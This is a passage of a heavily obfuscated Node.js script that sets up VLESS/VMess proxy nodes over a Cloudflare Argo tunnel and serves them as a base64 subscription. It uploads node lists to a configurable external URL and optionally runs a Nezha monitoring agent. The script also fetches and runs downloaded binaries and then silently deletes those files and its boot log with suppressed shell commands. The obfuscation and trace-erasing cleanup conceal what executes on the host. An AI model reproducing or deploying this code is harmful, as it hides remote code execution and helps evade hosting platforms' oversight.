_0xed14db=_0x2c4a,_0x39edef={'v':'2','ps':''+_0x511c76,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xed14db(_0x10112d._0x1fe497),'net':'ws','type':_0xed14db(_0x10112d._0x1fe497),'host':_0x36903f,'path':_0xed14db(_0x10112d._0x4e8d5a),'tls':_0xed14db(0x141),'sni':_0x36903f,'alpn':'','fp':'firefox'},_0xabda85=_0xed14db(0xdb)+UUID+'@'+CFIP+':'+CFPORT+_0xed14db(_0x10112d._0x39e650)+_0x36903f+'&fp=firefox&type=ws&host='+_0x36903f+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x511c76+'\x0a\x20\x20\x0avmess://'+Buffer[_0xed14db(_0x10112d._0x4ead78)](JSON[_0xed14db(_0x10112d._0x53df14)](_0x39edef))[_0xed14db(0xbe)](_0xed14db(_0x10112d._0x21d6d7))+_0xed14db(0x13d)+UUID+'@'+CFIP+':'+CFPORT+_0xed14db(_0x10112d._0x2db430)+_0x36903f+'&fp=firefox&type=ws&host='+_0x36903f+_0xed14db(0xc3)+_0x511c76+_0xed14db(0xf4);console[_0xed14db(0xa7)](Buffer[_0xed14db(_0x10112d._0x4ead78)](_0xabda85)[_0xed14db(_0x10112d._0x46973b)](_0xed14db(0xaf))),fs[_0xed14db(_0x10112d._0x58ed33)](subPath,Buffer[_0xed14db(_0x10112d._0x387235)](_0xabda85)[_0xed14db(_0x10112d._0x46973b)]('base64')),console[_0xed14db(_0x10112d._0x486904)](FILE_PATH+_0xed14db(_0x10112d._0x264b93)),uploadNodes(),app[_0xed14db(0x114)]('/'+SUB_PATH,(_0x1605f2,_0x1ae1d7)=>{const _0x1bc313=_0xed14db,_0x45565a=Buffer['from'](_0xabda85)['toString'](_0x1bc313(_0x404c06._0xb9471f));_0x1ae1d7[_0x1bc313(0xc4)](_0x1bc313(0x146),_0x1bc313(_0x404c06._0x4144fb)),_0x1ae1d7[_0x1bc313(0xbb)](_0x45565a);}),_0x16a54e(_0xabda85);},0x7d0);});}}async function uploadNodes(){const _0xda010a={_0x1d9973:0x120,_0x38359c:0xf7,_0x3d374a:0xf2,_0x4c355e:0xf6,_0x5762e4:0x155,_0x40bb9a:0x127,_0x546361:0xa7},_0x2b3f73=_0x1d27b4;if(UPLOAD_URL&&PROJECT_URL){const _0xa67702=PROJECT_URL+'/'+SUB_PATH,_0x75230d={'subscription':[_0xa67702]};try{const _0x569982=await axios[_0x2b3f73(_0xda010a._0x1d9973)](UPLOAD_URL+_0x2b3f73(_0xda010a._0x38359c),_0x75230d,{'headers':{'Content-Type':_0x2b3f73(0x125)}});return _0x569982&&_0x569982['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x569982):null;}catch(_0x24a6db){if(_0x24a6db[_0x2b3f73(0xdd)]){if(_0x24a6db[_0x2b3f73(0xdd)][_0x2b3f73(_0xda010a._0x3d374a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2b3f73(_0xda010a._0x4c355e)](listPath))return;const _0x3e65ec=fs[_0x2b3f73(0x10d)](listPath,'utf-8'),_0x1d7562=_0x3e65ec['split']('\x0a')[_0x2b3f73(0xc6)](_0x170e33=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x170e33));if(_0x1d7562['length']===0x0)return;const _0x3036ed=JSON[_0x2b3f73(_0xda010a._0x5762e4)]({'nodes':_0x1d7562});try{const _0x530356=await axios[_0x2b3f73(0x120)](UPLOAD_URL+_0x2b3f73(_0xda010a._0x40bb9a),_0x3036ed,{'headers':{'Content-Type':'application/json'}});return _0x530356&&_0x530356['status']===0xc8?(console[_0x2b3f73(_0xda010a._0x546361)](_0x2b3f73(0x113)),_0x530356):null;}catch(_0x379557){return null;}}else return;}}function cleanFiles(){const _0x21b9fd={_0x2b96e8:0xc9,_0x13a2ca:0xc9,_0x478f3c:0xd4,_0x37e29f:0x9f,_0x5a12c2:0xee,_0x1fef45:0x13c},_0x232498={_0x18d620:0xa4,_0x3a633c:0xdc,_0x1f47f1:0xe5};setTimeout(()=>{const _0x48e854={_0x41f62f:0xa7},_0x1c7cf8=_0x2c4a,_0x2497cd=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2497cd[_0x1c7cf8(_0x21b9fd._0x2b96e8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2497cd[_0x1c7cf8(_0x21b9fd._0x13a2ca)](phpPath);process[_0x1c7cf8(_0x21b9fd._0x478f3c)]==='win32'?exec(_0x1c7cf8(_0x21b9fd._0x37e29f)+_0x2497cd[_0x1c7cf8(_0x21b9fd._0x5a12c2)]('\x20')+'\x20>\x20nul\x202>&1',_0x18792c=>{const _0x262b70=_0x1c7cf8;console[_0x262b70(0xa4)](),console[_0x262b70(_0x48e854._0x41f62f)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x1c7cf8(_0x21b9fd._0x1fef45)+_0x2497cd[_0x1c7cf8(0xee)]('\x20')+'\x20>/dev/null\x202>&1',_0x5e89e4=>{const _0x52f723=_0x1c7cf8;console[_0x52f723(_0x232498._0x18d620)](),console[_0x52f723(0xa7)](_0x52f723(_0x232498._0x3a633c)),console['log'](_0x52f723(_0x232498._0x1f47f1));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x152e9e={_0x22c5e3:0xa3,_0x192b9f:0xa7,_0x424180:0x109,_0x22941b:0x12e},_0x467ff9=_0x1d27b4;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x467ff9(0x103));return;}try{const _0x243832=await axios['post'](_0x467ff9(_0x152e9e._0x22c5e3),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x467ff9(0x125)}});return console[_0x467ff9(_0x152e9e._0x192b9f)](_0x467ff9(_0x152e9e._0x424180)),_0x243832;}catch(_0x38f85a){return console[_0x467ff9(0x122)](_0x467ff9(_0x152e9e._0x22941b)+_0x38f85a[_0x467ff9(0xd5)]),null;}}async function startserver(){const _0x3665a5={_0x37efd0:0x14b},_0x547aba=_0x1d27b4;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3448ba){console['error'](_0x547aba(_0x3665a5._0x37efd0),_0x3448ba);}}startserver()['catch'](_0x52a249=>{const _0x58635b={_0x1b4d49:0x122,_0x1bbe97:0x10c},_0x3db57d=_0x1d27b4;console[_0x3db57d(_0x58635b._0x1b4d49)](_0x3db57d(_0x58635b._0x1bbe97),_0x52a249);}),app['listen'](PORT,()=>console[_0x1d27b4(0xa7)](_0x1d27b4(0xd6)+PORT+'!'));
